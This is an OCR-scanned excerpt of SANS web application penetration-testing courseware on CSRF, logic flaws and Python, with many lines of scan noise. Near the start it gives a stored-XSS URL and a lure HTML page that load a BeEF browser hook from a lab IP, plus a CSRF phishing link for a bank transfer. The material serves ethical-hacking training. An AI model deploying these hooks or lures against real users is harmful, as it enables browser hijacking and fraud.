based upon all or any portion of the Courseware, in any medium whether printed, electronic or 
otherwise, for any purpose, without the express prior written consent of the SANS Institute. 
Additionally, User may not sell, rent, lease, trade, or otherwise transfer the Courseware in any 
way, shape, or form without the express written consent of the SANS Institute. 
If any provision of this CLA is declared unenforceable in any jurisdiction, then such provision shall 
be deemed to be severable from this CLA and shall not affect the remainder thereof. An 
amendment or addendum to this CLA may accompany this courseware. 
SANS acknowledges that any and all software and/or tools, graphics, images, tables, charts or 
graphs presented in this courseware are the sole property of their respective 
trademark/registered/copyright owners, including: 
AirDrop, AirPort, AirPort Time Capsule, Apple, Apple Remote Desktop, Apple TV, App Nap, Back 
to My Mac, Boot Camp, Cocoa, FaceTime, FileVault, Finder, FireWire, FireWire logo, iCal, iChat, 
ilife, iMac, iMessage, iPad, iPad Air, iPad Mini, iPhone, iPhoto, iPod, iPod classic, iPod shuffle, 
iPod nano, iPod touch, iTunes, iTunes logo, iWork, Keychain, Keynote, Mac, Mac Logo, MacBook, 
MacBook Air, MacBook Pro, Macintosh, Mac OS, Mac Pro, Numbers, OS X, Pages, Passbook, 
Retina, Safari, Siri, Spaces, Spotlight, There's an app for that, Time Capsule, Time Machine, 
Touch ID, Xcode, Xserve, App Store, and iCloud are registered trademarks of Apple Inc. 
Governing Law: This Agreement shall be governed by the laws of the State of Maryland, USA. 
SEC542_5_O01_01 
'-../ 
\....,I 
'-../ 
'-../ 
'-../ 
'-../ 
'-../ 
'-../ 
'-../ 
'-../ 
'-../ 
'-../ 
'-../ 
'-../ 
'-../ 
'--../ 
'-../ 
'-../ 
'-../ 
'-./ 
'-../ 
'-../ 
'-./ 
'-../ 
'-./ 
'-../ 
'-../ 
'--../ 
'-../ 
'-../ 
'-./ 
'-../ 
'-../ 
,..___,, 
'----' 
'-' 
'-' 
'-../ 
'-' 
'-----' 
'-../ 
SEC542.5 
SW CSRF, Logic Flaws, 
and Advanced Tools 
Copyright 2018 Seth Misenar (GSE #28), Eric Conrad (GSE #13), Kevin Johnson 
Version DO I 
O I 
Welcome to SANS Security 542, Web App Penetration Testing and Ethical Hacking, Day 5! 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'----' 
'--' 
'----' 
SANS 
PENETRAT10N 
TESTING 
CURRLCULUM 
SEC460 
Enterprise Threat and 
Vulnerability Assessment 
SEC560 
Network Penetration Testing 
& Ethical Hacking 
SEC660 
Advanced Penetration Testing 
& Ethical Hacking 
Web App Penetration Testing & 
Ethk:al · Hacking 
SEC:642 
Advanced Web App Penetration 
Testing & Ethical Hacking 
AcuveDefense, Offensive 
Co·1mtermeasures & Cyber Deception 
SECS04 
Hacker Tools, Techniques, 
ExploitS &.Incident Handling 
SEC564 
R.edTeam Operations and 
Threat Emulation 
SEC573 
Automating Information 
Security with Python 
SEC760 
Advanced Exploit Development 
for Penetration Testers 
SEC56l 
lmmersive Hands-On 
Hacking Technique, 
ity Hands-on Kinetic 
Range Exerdse 
Mobile Device Security 
& Ethical Hacking 
Wireless Penetration Testing 
and Ethical Hacking 
SEC567 
Social Engineering 
for Penetration Testers 
SEC580 
Metasploit Kung Fufor 
Enterprise Pen Testing 
2-Day 
Course 
'----' 
'---' 
''----' 
'--' 
'--' 
'---' 
'----' 
'----' 
'--' 
'--" 
'--' 
'--' 
'--" 
'--' 
'--' 
'--' 
This slide shows the SANS Penetration Testing Curriculum, offering a variety of courses all focused on helping 
organizations improve their security through the use of penetration testing, vulnerability analysis, and Red Teaming. 
2 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'--" 
'----' 
'---' 
'--' 
'--' 
'--" 
'---' 
'-" 
'--' 
'--' 
'---' 
'---' 
'--' 
'----' 
'--" 
'--' 
'--" 
'--' 
'--" 
'---' 
'--' 
'---' 
Table of Contents 
Cross-Site Request Forgery 
. 
EXERCISE: CSRF 
. 
Logic Attacks 
. 
EXERCISE: Mobile MITM 
. 
Python for Web App Pen Testers 
. 
EXERCISE: Python 
. 
WPScan 
. 
EXERCISE: WPScan 
. 
w3af. 
. 
EXERCISE: w3af 
. 
Metasploit 
. 
EXERCISE: Metasploit 
. 
SEC542 jWebApp Penetration Testing and 
- 
5 
13 
15 
19 
21 
38 
40 
44 
45 
59 
61 
77 
3 
542.5 Table of Contents 
This table of contents outlines our plan for 542.5. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
3 
___, 
'-.-,' 
Table of Contents 
Ill 
When Tools Fail. 
. 
EXERCISE: When Tools Fail. 
.' 
. 
Pen Testing Methods 
. 
Web App Pen Test Preparation 
. 
Reporting and Presenting 
. 
Summary 
. 
79 
86 
88 
96 
105 
114 
SEC542 I Web App Penetration Tes~ing and Ethical Hacking 
4 
\...., 
'---- 
'---- 
'---- 
'-.J 
'--" 
'--" 
'--" 
'--" 
'-.../ 
'-.J 
'---' 
'----' 
'-.J 
'--" 
'-.../ 
'-.J 
542.5 Table of Contents 
'-.J 
'-.J 
Here is the rest of the Table of Contents for 542.5. 
'-.../ 
'---- 
'--../ 
'--../ 
'--" 
'-.../ 
'-....,' 
'--../ 
'----' 
'---- 
'-.J 
'---- 
'--" 
'-" 
'--../ 
'-" 
'---- 
'---- 
'---- 
4 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'---- 
'---- 
Course Roadmap 
• Day 1: Introduction and Information 
Gathering 
• Day 2: Configuration, Identity, and 
Authorization Testing 
• Day 3: Injection 
• Day 4: XXE and XSS 
• Day 5: CSRF, Logic Flaws, and 
Advanced Tools 
• Day 6: Capture the Flag 
CSRF, LOGIC FLAWS, AND ADVANCED TOOLS 
I • Cross-Site Request Forgery 
Exercise: CSRF 
3. Logic Murac1,cs 
4. Exercise: Mobile MITM 
5. Python for Web App Pen Testers 
6. Exercise: Python 
7. WPScan 
8. Exercise: WPScan 
9. w3af 
iO. Exercise; w3af 
I I. Metasploit 
12. Exerdse:·Metasploit 
13. When Tools Fail 
14. Exercise: When Tools Fail 
15. Pen Testing Methods 
16. Web App Pen Test Preparation 
17. Reporting and Presenting 
!It Summary 
Course Roadmap 
Welcome to Security 542, Web Penetration Testing and Ethical Hacking: Day 5. 
We will next discuss Cross-Site Request Forgery. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
5 
,._,, 
\._./ 
\._./ 
OTG.-SE_SS-005:Testing.-for)Cross-Site · Request•••Forgery(CSRF) 
CSRf isan.attack that forces an end user to execute 
unwanted actions on a web application in which he/ she is 
currently authenticated. With a little help of social 
engineering (like sending a link via email or chat), an 
attacker may force the users of a web application to 
execute actions of the attacker's choosing. A successful 
CSRF exploit can compromise end user data and operation, 
when it targets a normal user. If the targeted end user is 
the administrator account, a CSRF attack can compromise 
the entire web application.1 
\._./ 
'-" 
-.__,· 
'-,I 
'-,I 
.__, 
'-.../ 
'-,I 
'-,I 
'-" 
'-" 
'-,I 
'-" 
'-" 
Testing for Cross-Site Request Forgery flaws is the focus of Test ID OTG-SESS-005. Discovery of these flaws 
can prove challenging, but exploitation of the flaws could prove extremely impactful. 
While we're on the subject of OW ASP, their Cross-Site Request Forgery (CSRF) Prevention Cheat Sheet2 is an 
outstanding resource for preventing CSRF attacks. 
References: 
(1] https://www.owasp.org/index.php/Testing_for _ CSRF _(OTG-SESS-005) (http://cyber.gd/542 _ 155) QR 
(2) https://www.owasp.org/index.php/CSRF _Prevention_ Cheat_ Sheet (https://cyber.gd/542 _554) 
6 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-" 
'-..,I 
'-,I 
'--' 
'-' 
'--' 
'-' 
'--' 
,._,, 
'-' 
'--' 
'--' 
'-' 
'--' 
'--' 
'-" 
'-' 
'-" 
'-" 
'-" 
.____,, 
'--' 
'-' 
'-..,I 
'-..,I 
'--- 
The Difference between XSS and CSRF 
• Both Cross-Site Scripting (XSS) and Cross-Site Request Forgery (CSRF) 
involve the victim submitting a web request originally crafted by the attacker 
o The difference: XSS uses a script, while CSRF uses static content 
• Why isn't XSS called CSS? 
o The CSS acronym was already taken (Cascading Style Sheets) 
o Confusingly, CSRF is sometimes called XSRF - 
• XSS example (stored admin XSS leading to BeEF hook, see notes) 
http://mutillidae/index.php?page=<script 
src=http://192.168.1.8:3000/hook.js></script> 
• CSRF example (unauthorized bank transfer): 
<a href="http://bank.example.com/transfer.php?acct=4242&amount=100000"> 
Um, you better check out this video of you from Friday night</a> 
CSRF ( often pronounced "Sea-Surf') uses static content to exploit a victim, while XSS uses a scripting language 
(most commonly JavaScript). 
The XSS example above uses this URL: 
http://mutillidae/index.php?page=<script src=http://192.168.1.8:3000/hook.js></script> 
You may use this to demonstrate stored admin XSS via Mutillidae. Remember the BeEF lab? Start BeEF, visit 
that link in Firefox and then go to the BeEF controller. In Chromium: To Mutillidae -> View Log. Boom! 
Chromium is now hooked. 
You can also simply have the victim visit a page. Here is the custom HTML page we saw in 542.4 that hooks 
the browser with BeEF. It's available in the Security542 Linux VM at http://www.sec542.org/bunny.html. 
<html> 
<head>OMG look at the cute bunny!</head> 
<body> 
<img src="images/babybunny.jpg" style="width: 100%"> 
<script type="text/javascript" src="http://192.168.1.8:3000/hook.js"> 
</script></body></html> 
<!-- Image credit: NagisaXTomoya<3 --> 
<!-- Image source: https://www.flickr.com/photos/465l7023@N08/4353428267/-- 
> 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
7 
'-' 
'-' 
CSRF Visualized: Step·· 1 
Step 1: Attacker performs vulnerability research on a site and/or 
application, finds a CSRF flaw 
• Often by discovering a transaction that does not require a dynamic element 
(such as a secure random transaction token), and/or uses weak anti-CSRF 
protection (such as checking the referer) 
http://bank.exainple 
transfer.php? 
acct=4242&amount=1000 
'-" 
.____,, 
'-J 
'-J 
'-J 
'-J 
'-J 
'-J 
'-J 
.____,, 
'-J 
'-J 
'-' 
'-' 
The attacker analyzes the website during the research phase of the attack. He or she will often create an account 
on the victim site (or in the victim web application), and test various transactions with an eye towards critical 
examples such as authentication, password changes, transfer of funds, etc. 
Many newer penetration testers are initially confused by this step: How did the attacker get access in the first 
place? This is often quite easy: Anyone can create an Amazon, eBay, Pay Pal, Facebook, etc., account. Or 
download and run open source software ( or purchase most commercial software). Or open a bank account by 
depositing $20. The tester may also be conducting full-knowledge/crystal-box testing, and receive credentials 
from their client. Or use a guest account. There are plenty of options here! 
During the research, let's assume the attacker discovers this transfer.php script, which does not appear to use any 
kind of dynamic element: 
http://bank.example.com/transfer.php?acct=4242&amount=l000 
The attacker then transfers money to his or her own account (sometimes from one to another, such as checking 
to debit). The attacker could also open two accounts, transferring from one to another. The attacker carefully 
observes the transaction (usually via an interception proxy such as Burp or ZAP), carefully checking for any 
security mechanisms. 
Credit card image from http ://www.softicons.com/business-icons/credit-cards-icon-set-by-yootheme/ generic- 
bank-icon (https://cyber.gd/542 _560) 
8 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-' 
'-' 
'-' 
.____,, 
.____,, 
'-J 
'-J 
'-J 
,.__, 
,.__,. 
,.__, 
'-' 
'-' 
'-' 
.____,, 
.__,, 
'-' 
'-J 
.____,, 
.____,, 
'-' 
.____,, 
'---' 
'-J 
'-' 
.____,, 
• Step 2: Attacker emails 
the CSRF link to the 
victim 
o Other options include posting 
the CSRF link on a website the 
victim is likely to go to (like a 
blog, social media site, etc.) 
• Note the actual linked URL 
(shown when the user 
hovers the mouse over the 
'video' link) 
\ * 
Subject 
+eve you ~I\ this vide:e-~ 
fomi Min') 
Xlb}~-1 Ha;ve.y<J(.l~ tb.is wiM? 
~2Q,Ar.,f 
«"""Jlr11d@~ it.mm tJ 
Uh oh, .... 
The example above uses the Thunderbird email client. The HTML was created with Thunderbird's handy Insert 
-> HTML menu: 
io: 
econrad~mail,<:om 
<a hrefa''http://bank.example.com/transfer.php?acct=4242.&amount:100000">1Jm, you 
better check out this video of you from Friday night</ a> 
Example: 
<i;,, Hello World! <Ii> 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
9 
'---" 
'---" 
Step 3: 
1. Victim logs into the bank in their browser 
2. Victim opens CSRF email and clicks on link 
• 
CSRF link is usually opened in the same browser 
'---" 
'-" 
'-" 
'--' 
'-" 
'---" 
'--' 
'---" 
'-" 
'-" 
'--' 
'-" 
'-" 
'-" 
While the user clicks on an email link (in this example), the link will render in their browser. This is the default 
behavior: Links shown in other clients (such as email clients, IM clients, etc.) will render in the system's default 
browser. Even simpler: Many users read email in the same browser they use to bank in (which is how Gmail, 
etc. work), so the link will naturally render in the same browser. 
Note we use email as the simplest example here (and also because it's the basis of countless phishing 
campaigns). Any link will work, as long as it reaches the victim's browser unmolested. Social media sites are 
often used for this purpose: Post a provocative link on the user's Facebook page, for example. 
The upcoming CSRF lab will use WordPress to provide the original link vector. 
Credit card image from http://www.softicons.com/business-icons/credit-cards-icon-set-by-yootheme/generic- 
bank-icon (https://cyber.gd/542 _560) 
10 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'--' 
'--' 
'--' 
'-" 
'--' 
'-" 
'--' 
'--' 
'--' 
'----' 
'--' 
'--' 
'--' 
'-" 
'--' 
'--' 
'-....,, 
'--' 
'--' 
'----' 
'-" 
'--' 
'-....,, 
'-" 
'-" 
'-....,, 
CSRFVisualized: Step 4 
Step 4: Victim performs the same transaction shown in step 
1 
• In this case: transferring money from victim account to attacker 
account 
Why does the transaction work? A few points to keep in mind: 
• 
The victim is logged into the bank in their browser (and has cookies, etc., proving so) 
• 
The transfer transaction comes from the victim's authorized browser 
• 
The same-origin policy of the transfer matches the original bank login and subsequent cookies, etc. 
• 
Same protocol, name, and port as the subsequent transfer request 
• 
In this case: The bank site does not know the link originated from another source (email, in this case) 
The last point is the crux of the issue: The bank site must know the transaction originated somewhere else 
(hence the word "cross" in Cross-Site Scripting). How to do this? In addition to strict enforcement of the same- 
origin policy, OW ASP suggests synchronizer (CSRF) tokens: 
Synchronizer (CSRF) Tokens 
• Any state changing operation requires a secure random token (e.g., CSRF token) to prevent CSRF 
attacks 
• 
Characteristics of a CSRF Token 
Unique per user session 
• 
Large random value 
• 
Generated by a cryptographically secure random number generator
1 
Credit card image from http://www.nanozine.org/credit-card-clipart-png.html 
(https://cyber.gd/542 _555) 
Reference: 
[I] http://www.softicons.com/business-icons/credit-cards-icon-set-by-yootheme/ 
generic-bank-icon (https://cyber.gd/542 _560) QR 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
11 
.__., 
ZAP Anti CSRF.Test Forrn 
• ZAP includes CSRF testing functionality via "Generate Anti CSRF Test FORM" 
o This automates the process of creating PoC (Proof-of-Concept) code to discover CSRF flaws via 
POSTs 
• Usage is simple: 
o Find a POST that may be vulnerable to CSRF 
o Right-click on the POST, and choose 
"Generate Anti CSRF Test FORM" 
o Click submit 
• Note: The penetration tester (usually) 
needs to be logged into the vulnerable 
application 
o See notes below for more detail 
• If the transaction submits, the application 
likely has a CSRF flaw 
http://www.sec542.org/webcalendar/edit_user_handler.php 
formtype 
[setpassword 
upasswordl 1r:.s,=,=".=,,=y54=2=====================l1• 
upasswordz IS>Kurity542 
, 
user 
~!a=d=m=m=======================I 
'-..,I 
'-..,I 
'----' 
'-.,/ 
'-.,/ 
'-.,/ 
'-.....,I 
'-..,I 
'--./ 
'-..,I 
'-.,/ 
'---' 
'-.,/ 
'---' 
To create the form: Find a POST, right-click and choose "Generate Anti CSRF Request FORM": 
, Req. Ttmestamp 
I Meth,)_d _HJPJ. 
1 12/01/1713:%:13 GET 
http:/Jw#w.se<542.otgrwebtalendar/user<.php 
4 12/01/1713:39:14 
GET 
http,b-·••c~42.or~bcalend•r~,_cach•r.php7inc-js/ ... 
5 12[01/17 13: 39:16 
GET 
http:il'W**-"lilc:~42.org,t#abcalvnd.ir/•dit_u,er.r.ihp?uier-.il, .. 
6 12/01/17 :3:39:17 
GET 
http:/r-w.sec542,or, 
Atta:k 
Include in Cont-;;:.n: 
Rur. application 
Ffa1g as Context 
RfSl?rn:L 
NewA¾erL, 
sues Tab 
Open l)RL !n Bro--wser 
to 
'----- 
'--./ 
'--./ 
'--./ 
'----' 
'----' 
'-.....,I 
" .. 
~ 
• 
• .. 
,. 
" 
'--./ 
'-._,/ 
'----' 
'--./ 
'--./ 
'----' 
'--./ 
'--./ 
'--./ 
During the PoC stage: A penetration tester typically uses the form to 'own' his or herself, while logged into the 
vulnerable application (usually in a different tab in the same browser). This may seem confusing: It's important 
to separate the vulnerability discovery phase (this step) with the exploitation phase (which comes later, based on 
information gained during this phase). 
If successful: The penetration tester will later weaponize this step, which we will perform in the upcoming 
CSRF lab. 
12 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'----' 
'-.,/ 
'-.,/ 
'--./ 
'-.....,I 
'---' 
\J 
'-...J 
~ 
\....., 
Course Roadmap 
• Day 1: Introduction and Information 
Gathering 
• Day 2: Configuration, Identity, and 
Authorization Testing 
• Day 3: Injection 
• Day 4: XXE and XSS 
• Day 5: CSRF, Logic Flaws, and 
Advanced Tools 
• Day 6: Capture the Flag 
CSRF, LOGIC FLAWS,AND ADVANCED TOOLS 
I. Cross-Site Request Forgery 
2. Exercise: CSRF 
3. logic Attacks 
4. Exercise: Mobile MITH 
5. Pythcm for Web App Pen Testers 
6. Exercise: Python 
1. WPScan 
8. Exercise: WPScan 
9.wlaf 
! 0. Exercise; w3af 
! i. Metasploit 
I l 
.. Exercise: Metasploit 
When 
S!:C541 J Web App Penetration Testing and Ethical Hacking 
13 
Course Roadmap 
Our next lab is on Cross-Site Request Forgery (CSRF). 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
13 
'---' 
'-" 
SEC542Workbook:CSRF 
Exercise 5.1: CSRF 
'-" 
'-" 
'-" 
'-" 
'-" 
'-" 
'-" 
'-" 
'-" 
'-" 
'-" 
\.._,, 
'-" 
'-" 
SEC542 Workbook: CSRF 
Please go to Exercise 5.1 in the 542 Workbook. 
14 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-" 
'-" 
\.._,, 
'-" 
'-" 
'-" 
'-" 
'-" 
'-" 
'--../ 
'-" 
'-" 
'-" 
'-" 
'--../ 
'-" 
'-../ 
'-" 
'-../ 
'-../ 
'-" 
'-../ 
'---' 
'-../ 
'-" 
'-" 
Course Roadmap 
• Day 1: Introduction and Information 
Gathering 
• Day 2: Configuration, Identity, and 
Authorization Testing 
• Day 3: Injection 
• Day 4: XXE and XSS 
• Day 5: CSRF, Logic Flaws, and 
Advanced Tools 
• Day 6: Capture the Flag 
CSRFt LOGIC FLAWStANDADVANCEDTOOLS 
I • Cross-Site Request Forgery 
l. Exercise: CSRf 
3. Logic Attacks 
-4. E1tercise: Mobile MITH 
S. Python for Web App Pen Testers 
6. Exercise: Python 
7,WPScan 
ii. Exercise: WPScan 
9. wlaf 
I 0. Exercise: wlaf 
I I • Metasploit 
12. Exercise: Hetasploit 
13. When :'Tools Fail 
14. Exercise: Wben Tools Fail 
15. Pen Testing Methods 
16. Web App Pen Test Preparation 
17. Reporting and Presenting 
I&. Summary 
Course Roadmap 
We will next discuss logic attacks. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
15 
'-...,I 
'--' 
• Client controls code execution 
• Business logic is included in the client code: 
o Calls functionality on the server 
• Attacker manually calls functions in a different order 
• Application processes the transaction incorrectly 
• Logic attacks are difficult for automated tools to find 
'--' 
'--' 
'-./ 
\.._../ 
'-./ 
'-./ 
'-./ 
'-./ 
'-./ 
'-./ 
'-./ 
'-./ 
'---' 
'-.../ 
AJAX and Web 2.0 are a great thing for logical attackers! This is due to the business logic sent and executing on 
the client side. A tester can walk through a successful transaction. By intercepting each step in the process, the 
tester can examine each call throughout the process looking for the application flow. By manually calling 
portions of the transaction before the application expected it to be, the tester can find vulnerabilities. 
16 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'---' 
'-./ 
'---' 
'---' 
'---' 
'---' 
'--' 
\.._../ 
\.._../ 
\.._../ 
'-' 
'-.../ 
'---' 
\.._../ 
'-..../ 
'---' 
'---' 
'-.../ 
'-.../ 
'-.../ 
'-.../ 
'-.../ 
'-.../ 
'-./ 
'-.../ 
'---' 
l.ogic Attack Example 
'fotalthe 
Cart 
A.ul:horize 
the Credit 
Card 
Add Items to 
Cart 
For example, you have a shopping cart that follows this process: 
1. Add item to cart. 
2. Total cost. 
3. Authorize card. 
4. Check out. 
Because the application stores the state of each step, the tester could call the authorize card before the add item. 
This would cause an authorization for a zero balance. Then when the items are added, the checkout would be 
called next. The application would "assume" that the authorization was done after the items were added and will 
allow the checkout. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
17 
'-' 
Discovering Logic Flaws 
• Discovering logic flaws is a manual process 
• Most tools can't examine logic 
o They test functionality 
• This requires the tester to find the flaws 
o Mapping the application is crucial for this discovery step 
• These types of flaws are more difficult to find 
• Typically, even harder to fix 
'-' 
'-J 
'-J 
'-" 
'-J 
'-" 
'-" 
'--.../ 
'--.../ 
'--.../ 
'--.../ 
'-J 
'--.../ 
'-" 
'--.../ 
'--.../ 
'--.../ 
Logic flaws are typically not found via automated tools. The reason is that the tools are not designed to perform 
logic tests; they are designed to exercise functionality and find flaws that exist within that functionality. To find 
the logic flaw, the tool would need to evaluate the success of the attack. For example, for the flaw in the 
shopping cart discussed previously, the tool would need to understand that it was testing a shopping cart and 
would also need to figure out where to detect that the transaction had succeeded. 
Although it is harder for us to find these flaws, it is typically even more difficult to fix them. The reason is that 
the logic of an application is usually integral to the architecture, so changing that has a greater impact. Because 
of this, as testers, we need to look for recommendations that can lower the risk of the attack. Using the shopping 
cart example again, one recommendation may be to implement a workflow that validates orders against billing 
totals before shipping. 
18 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-J 
'--.../ 
'-J 
'-J 
'--.../ 
'--.../ 
'-" 
'--.../ 
'-' 
'--.../ 
'-" 
'--.../ 
''---,/ 
'--.../ 
'-J 
'-' 
'-" 
'--.../ 
'-J 
'--.../ 
'--.../ 
'--.../ 
'-" 
Course Roadmap 
• Day 1: Introduction and Information 
Gathering 
• Day 2: Configuration, Identity, and 
Authorization Testing 
• Day 3: Injection 
• Day 4: XXE and XSS 
• Day 5: CSRF, Logic Flaws, and 
Advanced Tools 
• Day 6: Capture the Flag 
CSRF, LOGIC FLAWS,ANDADVANCEDTOOLS 
I. Cross-Site Request Forgery 
l. Exercise: CSRF 
3. Logic Attacks 
4. Exercise: Mobile MITM 
5. ~ython for Web App Pen Testers 
6. Exercise: Python 
7.WPScan 
a. E!xerdse: WPSi:;an 
9. wlaf 
10. E1tercise: wlaf 
I I • Metllsploit 
I l. Exercise: Metasploit 
13. When Tools Fail 
14. Exercise: When Tools Fail 
15. Pen Testing Methods 
16. Web App Pen Test Preparation 
17. Reporting and Pre!lenting 
18. Summary 
Course Roadmap 
The next exercise will have us use Burp to intercept a mobile banking application's traffic. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
19 
'--..,I 
v 
SEC542Workbook: Mobile· MITM 
Exercise 5.2: Mobile MITM 
'-../ 
'-../ 
'---' 
'-../ 
\._J 
'-../ 
\._J 
\._J 
'-../ 
\._J 
'-../ 
'---" 
SEC542 Workbook: Mobile MITM 
Please go to Exercise 5.2 in the 542 Workbook. 
20 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
\._J 
'---" 
\._J 
\._J 
\._J 
'-../ 
'-../ 
\._J 
\._J 
\._J 
\._J 
\._J 
'-../ 
'-../ 
'---" 
'-../ 
'---" 
'-../ 
'-../ 
'---" 
'-.J 
'-.J 
'-.J 
\._J 
'-../ 
'-.-/ 
Course Roadmap 
• Day 1: Introduction and Information 
Gathering 
• Day 2: Configuration, Identity, and 
Authorization Testing 
• Day 3: Injection 
• Day 4: XXE and XSS 
• Day 5: CSRF, Logic Flaws, and 
Advanced Tools 
• Day 6: Capture the Flag 
CSRF, LOGIC FLAWS,ANDADVANCEDTOOLS 
I. Cross-Site Request Forgery 
l. Exercise: CSRF 
3. Logic Attacks 
4. Exercise: Mobile MITM 
S. Python for Web App Pen Testers 
6. Exercise: Python 
7. WPScan 
I. Exercise: WPScan 
9. wlaf 
JO. Exercise; wlaf 
11. Metasploit 
12, Exercise: Metasploit 
B. When Tools Fail 
14. Exercise; When Tools fail 
IS. Pen Testing Methods 
16. Web App Pen Test Preparation 
17. Reporting and Presenting 
IS.Summary 
Course Roadmap 
We will next discuss Python for web application penetration testers. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
21 
'--' 
• Python is an interpreted programming language created by Guido 
van Rossum in the late 1980s 
oNamed after Monty Python's Flying Circus 
oFirst public release was in February 1991 (version 0.9.0) 
o Inspired by the ABC programming language 
oPython is an interpreted, object-oriented, high-level programming 
language with dynamic semantics. Its high-level built in data structures, 
combined with dynamic typing and dynamic binding, make it very 
attractive for Rapid Application Development, as well as for use as a 
scripting or glue language to connect existing components together. 
Python's simple, easy to learn syntax emphasizes readability and 
therefore reduces the cost of program maintenance. 1 
'--' 
'-.,/ 
'-.,/ 
'-../ 
'-' 
'-' 
'-' 
'-.,/ 
'-.,/ 
'-' 
'-' 
'-..../ 
Guido van Rossum worked at Centrum voor Wiskunde en Informatica (CWI), Netherland's national research 
institute for mathematics and computer science.2 He had been using the ABC language (created at CW!): 
I don't know how well people know ABC's influence on Python. I try to mention ABC's influence because I'm 
indebted to everything! learned during that project and to the people who worked on it. ABC's design had a 
very clear, sharp focus. ABC was intended to be a programming language that could be taught to intelligent 
computer users who were not computer programmers or software developers in any sense. 3 
He became frustrated with some elements of ABC, including its monolithic design: 
1 think my most innovative contribution to Python's success was making it easy to extend. That also came out of 
my frustration with ABC. ABC was a very monolithic design. There was a language design team, and they were 
God. They designed every language detail and there was no way to add to it. You could write your own 
programs, but you couldn't easily add low-level stuff.4 
Extensibility is one of Python's 'killer features': Libraries such as Scapy5 and Requests6 (to name two ofliterally 
hundreds of useful Python libraries) truly unlock Python's potential for information security applications. 
References: 
[I] https://www.python.org/doc/essays/blurb/ (https://cyber.gd/542 _529) QR 
[2] https://www.cwi.nl/ (https://cyber.gd/542 _530) 
[3] Ibid. 
[4] http://www.artima.com/intv/pythonP.html (https://cyber.gd/542 _531) 
[5] http://www.secdev.org/projects/scapy/ (https://cyber.gd/542 _532) 
[ 6) http://docs.python-requests.org/en/master/ (https://cyber.gd/542 _ 53 3) 
22 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-..../ 
'-.,/ 
'-' 
\.__./ 
'-" 
'-.,/ 
'--' 
\.__./ 
\.__./ 
'-.,/ 
'-"' 
'-..../ 
'-..../ 
'--' 
'-..../ 
'-..../ 
'-..../ 
'--' 
\.__./ 
'-.,/ 
'-..../ 
'-.,/ 
'--" 
'--" 
'-..../ 
'-.,/ 
Why Python for Pen Testers? 
• Short answer: It's the right tool for the job 
• We won't get into a language war, but Python has strengths that line up 
directly with penetration testers' needs 
o Basic Python scripts are very fast to write 
o Many libraries support easy creation of HTIP requests, parsing of responses, etc. 
o Many (many) penetration testing tools are written in Python 
• The wisdom gained via industry experience has taught the course authors to 
be tool (and operating system) agnostic 
o Carpenters don't blindly favor hammers over screwdrivers, for example 
No language wars here: It comes down to the right tool for the job. Penetration testers should think like 
carpenters: Have a toolbox with a sufficient variety of quality tools, have the knowledge and experience to use 
each of them, and choose the best tool for each job. 
If the question were "What programming language is best for carving up lots of text?", the answer would be 
Perl. Yes, how quaint, we get it, but it remains that go-to text-carving language in the (biased) opinion of the 
old-school course authors. Python stands out (for penetration testers) for the effortless ability to create sockets, 
as well as more advanced web traffic. 
Here's a challenge: Write a script that will connect to a web server and display the server's product string only. 
Here's that script in Python 2 (more to come on Python 2 vs. 3 in a bit), using the Requests library (save as 
/home/ student/product. py): 
#!/usr/bin/python 
import requests 
r = requests.get('http://www.sec542.org') 
print r.headers['server'] 
Here's the output: 
$ 
./product.py 
Apache/2.4.7 (Ubuntu) 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
23 
....._, 
....._, 
Python is installed natively in macOS, in most Linux distributions, and in some 
versions of UNIX 
• Available via a simple install on most platforms, including 'Other' (see notes below) that 
don't have it installed natively 
• See: https://www.python.org/downloads 
• Type the following to see if Python is installed (and the version of Python): 
$ python -V 
Installers and zip archives are available for 32- and 64-bit versions of Windows 
• See: https://www.python.org/downloads/windows/ 
• Also available for DOS! 
o See: http://www.caddit.net/pythond/ 
....._, 
....._, 
....._, 
....._, 
...__,, 
....._, 
'-.J 
'-.J 
'--" 
...__,, 
'-.J 
....._, 
...__,, 
Python offers robust support across a multitude of platforms. Linux, UNIX, macOS, and Windows are included, 
of course. 
It is also notable for the broad support of a variety of other platforms, such as VMS and AS/400. Here's the list 
(from https://www.python.org/download/other/): 
• 
AS/400 (OS/400) 
• 
BeOS 
• 
MorphOS 
• 
MS-DOS 
• 
OS/2 
• 
OS/390 and z/OS 
• 
RISC OS 
• 
Series 60 (Nokia Symbian OS-based Series 60 smartphone platform) 
• 
Solaris 
• 
VMS 
• 
Windows CE or Pocket PC 
• 
HP-UX1 
Reference: 
[l] https://www.python.org/download/other/ (https://cyber.gd/542 _534) 
24 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'--" 
....._, 
'-.J 
'-.J 
'-.J 
...__,, 
..._,, 
'-.J 
'-.J 
..._,, 
'-.J 
'-.../ 
'-.J 
'----' 
'-.J 
'-.J 
'-.J 
...__,, 
'-.J 
'---' 
'----' 
'-.J 
'-.J 
'-.J 
...__,, 
'-.J 
Python 2 vs. Python 3 
• Short version: Python 2.x is legacy, Python 3.x is the present and future of the 
language1 
• As noted above, Python 2 is the 'legacy' version of Python 
o Final major release was version 2.7 in 2010 
o Minor updates (security fixes, etc.) have followed 
